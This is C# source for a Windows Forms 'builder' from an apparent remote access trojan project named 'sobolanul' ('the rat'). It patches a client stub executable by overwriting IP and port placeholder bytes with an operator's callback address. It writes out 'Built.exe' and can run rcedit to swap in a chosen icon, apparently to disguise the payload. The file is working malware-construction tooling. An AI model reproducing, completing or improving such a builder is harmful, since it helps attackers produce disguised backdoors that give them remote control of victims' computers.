using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace sobolanul_server
{
    public partial class BuilderForm : Form
    {
        public BuilderForm()
        {
            InitializeComponent();

            this.Region = Region.FromHrgn(WinApi.CreateRoundRectRgn(
                0, 0,
                this.Width,
                this.Height,
                20, 20
            ));
        }

        private void BuilderForm_Load(object sender, EventArgs e)
        {
            ipTextBox.Text = "127.0.0.1";
            portNumericUpDown.Value = 7777;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            string ip = ipTextBox.Text.Trim(); 
            int port = (int)portNumericUpDown.Value;

            if (string.IsNullOrEmpty(ip))
            {
                MessageBox.Show("Please enter an IP address.");
                return;
            }

            string stubPath = "sobolanul.exe"; // client run 
            if (!File.Exists(stubPath))
            {
                MessageBox.Show($"Stub not found: {stubPath}");
                return;
            }


            // reading sobolanul.exe  and load it in memory with byte[] to modify the entire content
            byte[] stubBytes = File.ReadAllBytes(stubPath);

            string ipPlaceholderStr = "IP_PLACEHOLDER_______________________________________________";
            byte[] ipPlaceholder = Encoding.ASCII.GetBytes(ipPlaceholderStr);

            int ipOffset = FindBytes(stubBytes, ipPlaceholder);
            if (ipOffset < 0)
            {
                MessageBox.Show("IP Placeholder not found");
                return;
            }

            byte[] ipBuffer = new byte[ipPlaceholder.Length];
            byte[] ipBytes = Encoding.ASCII.GetBytes(ip);
            if (ipBytes.Length > ipBuffer.Length)
            {
                MessageBox.Show("IP too long");
                return;
            }
            Array.Copy(ipBytes, ipBuffer, ipBytes.Length);
            Array.Copy(ipBuffer, 0, stubBytes, ipOffset, ipBuffer.Length);

            string portPlaceholderStr = "PORTPLAC";
            byte[] portPlaceholder = Encoding.ASCII.GetBytes(portPlaceholderStr);

            int portOffset = FindBytes(stubBytes, portPlaceholder);
            if (portOffset < 0)
            {
                MessageBox.Show("PORT Placeholder not found");
                return;
            }

            byte[] portBuffer = new byte[portPlaceholder.Length];
            byte[] portBytes = Encoding.ASCII.GetBytes(port.ToString());
            if (portBytes.Length > portBuffer.Length)
            {
                MessageBox.Show("Port too large");
                return;
            }
            Array.Copy(portBytes, portBuffer, portBytes.Length);
            Array.Copy(portBuffer, 0, stubBytes, portOffset, portBuffer.Length);

            string outputExe = "Built.exe";
            File.WriteAllBytes(outputExe, stubBytes);

            string iconFile = iconTextBox.Text.Trim();
            if (!string.IsNullOrEmpty(iconFile) && File.Exists(iconFile))
            {
                try
                {
                    string rceditExe = "rcedit-x86.exe";
                    // rcedit ".exe" --set-icon "path-to-icon.ico"
                    string arguments = $"\"{outputExe}\" --set-icon \"{iconFile}\"";

                    var psi = new ProcessStartInfo(rceditExe, arguments)
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    using (var proc = Process.Start(psi))
                    {
                        proc.WaitForExit();
                        if (proc.ExitCode != 0)
                            MessageBox.Show($"rcedit failed {proc.ExitCode}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error setting icon: " + ex.Message);
                }
            }

            MessageBox.Show($"stub built - {outputExe}");
        }

        private int FindBytes(byte[] haystack, byte[] needle)
        {
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }

        private void browseButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon Files|*.ico";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    iconTextBox.Text = ofd.FileName;
                }
            }
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            WinApi.ReleaseCapture();
            WinApi.SendMessage(this.Handle, WinApi.WM_NCLBUTTONDOWN, WinApi.HT_CAPTION, 0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
